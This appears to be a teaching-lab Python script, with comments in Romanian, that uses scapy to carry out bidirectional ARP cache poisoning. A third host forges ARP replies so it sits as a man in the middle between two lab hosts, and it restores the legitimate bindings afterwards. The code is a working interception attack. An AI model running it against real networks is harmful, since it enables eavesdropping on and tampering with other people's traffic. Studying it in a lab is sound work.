#!/usr/bin/env python3
"""
arp_poisoner.py - Otravirea bidirectionala a cache-urilor ARP (h3 = MITM).

La fiecare interval, h3 trimite doua afirmatii ARP false (op=2, reply):
  * catre h2:  "10.0.0.1 (h1) este la MAC_h3"
  * catre h1:  "10.0.0.2 (h2) este la MAC_h3"
Astfel, cadrele dintre h1 si h2 sunt adresate Ethernet catre h3.

"""
from __future__ import annotations

import argparse
import os
import sys
import threading
import time

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from lab_config import load_lab

from scapy.all import ARP, Ether, sendp, conf  # noqa: E402


class ArpPoisoner:
    def __init__(self, iface, h1_ip, h1_mac, h2_ip, h2_mac, h3_mac,
                 period_s=2.0, logger=print):
        self.iface = iface
        self.h1_ip, self.h1_mac = h1_ip, h1_mac
        self.h2_ip, self.h2_mac = h2_ip, h2_mac
        self.h3_mac = h3_mac
        self.period_s = period_s
        self.log = logger
        self._thread = None

    def send_pair(self):
        # catre h2: h1_ip -> mac_h3
        poison_h2 = ARP(op=2, psrc=self.h1_ip, hwsrc=self.h3_mac,
                        pdst=self.h2_ip, hwdst=self.h2_mac)
        # catre h1: h2_ip -> mac_h3
        poison_h1 = ARP(op=2, psrc=self.h2_ip, hwsrc=self.h3_mac,
                        pdst=self.h1_ip, hwdst=self.h1_mac)
        sendp(Ether(src=self.h3_mac, dst=self.h2_mac) / poison_h2,
              iface=self.iface, verbose=False)
        sendp(Ether(src=self.h3_mac, dst=self.h1_mac) / poison_h1,
              iface=self.iface, verbose=False)

    def _loop(self, stop_event):
        n = 0
        while not stop_event.is_set():
            self.send_pair()
            n += 1
            if n == 1:
                self.log(f"[poisoner] otravire pornita (perioada {self.period_s}s)")
            stop_event.wait(self.period_s)
        self.log(f"[poisoner] oprit dupa {n} perechi ARP")

    def start(self, stop_event: threading.Event):
        self._thread = threading.Thread(target=self._loop, args=(stop_event,),
                                        daemon=True)
        self._thread.start()
        return self._thread

    def restore(self):
        """Trimite ARP corectiv cu binding-urile legitime (recuperare)."""
        fix_h2 = ARP(op=2, psrc=self.h1_ip, hwsrc=self.h1_mac,
                     pdst=self.h2_ip, hwdst=self.h2_mac)
        fix_h1 = ARP(op=2, psrc=self.h2_ip, hwsrc=self.h2_mac,
                     pdst=self.h1_ip, hwdst=self.h1_mac)
        for _ in range(3):
            sendp(Ether(src=self.h1_mac, dst=self.h2_mac) / fix_h2,
                  iface=self.iface, verbose=False)
            sendp(Ether(src=self.h2_mac, dst=self.h1_mac) / fix_h1,
                  iface=self.iface, verbose=False)
            time.sleep(0.2)
        self.log("[poisoner] binding-uri legitime restaurate (ARP corectiv)")


def main():
    lab = load_lab()
    h1, h2, h3 = lab.host("h1"), lab.host("h2"), lab.host("h3")
    ap = argparse.ArgumentParser(description="ARP poisoner (laborator SDN)")
    ap.add_argument("--iface", default="h3-eth0")
    ap.add_argument("--period", type=float, default=2.0)
    ap.add_argument("--duration", type=float, required=True,
                    help="durata maxima in secunde (OBLIGATORIU)")
    args = ap.parse_args()

    if os.geteuid() != 0:
        sys.exit("[EROARE] Ruleaza ca root.")
    conf.verb = 0

    poisoner = ArpPoisoner(args.iface, h1.ip, h1.mac, h2.ip, h2.mac, h3.mac,
                           period_s=args.period)
    stop = threading.Event()
    poisoner.start(stop)
    try:
        time.sleep(args.duration)
    except KeyboardInterrupt:
        pass
    finally:
        stop.set()
        time.sleep(args.period + 0.2)
        poisoner.restore()


if __name__ == "__main__":
    main()